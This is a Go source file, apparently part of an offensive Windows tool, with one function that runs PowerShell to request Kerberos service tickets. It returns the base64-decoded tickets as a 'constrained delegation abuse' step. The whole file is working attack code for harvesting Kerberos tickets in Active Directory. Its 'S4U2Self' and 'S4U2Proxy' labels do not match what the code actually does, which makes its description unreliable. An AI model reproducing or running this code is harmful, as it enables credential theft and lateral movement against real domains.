//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

func abuseConstrainedDelegation(userPrincipal, targetSPN string) ([]byte, error) {
	if userPrincipal == "" || targetSPN == "" {
		return nil, fmt.Errorf("usage: abuseConstrainedDelegation(userPrincipal, targetSPN)")
	}

	psCmd := fmt.Sprintf(`
Add-Type -AssemblyName System.IdentityModel
try {
	$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "%s"
	$s4uBytes = $ticket.GetRequest()
	$b64 = [Convert]::ToBase64String($s4uBytes)
	Write-Output "S4U2Self_TICKET:$b64"

	$tgsReq = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "%s"
	$tgsBytes = $tgsReq.GetRequest()
	$tgsB64 = [Convert]::ToBase64String($tgsBytes)
	Write-Output "S4U2Proxy_TICKET:$tgsB64"

	Write-Output "Constrained delegation abuse completed for target: %s"
} catch {
	Write-Error "Constrained delegation failed: $_"
}
`, userPrincipal, targetSPN, targetSPN)

	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return nil, fmt.Errorf("constrained delegation failed: %w\nOutput: %s", err, out)
	}

	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "S4U2Proxy_TICKET:") {
			ticketB64 := strings.TrimPrefix(line, "S4U2Proxy_TICKET:")
			data, err := base64.StdEncoding.DecodeString(ticketB64)
			if err == nil {
				return data, nil
			}
		}
	}

	return []byte(out), nil
}
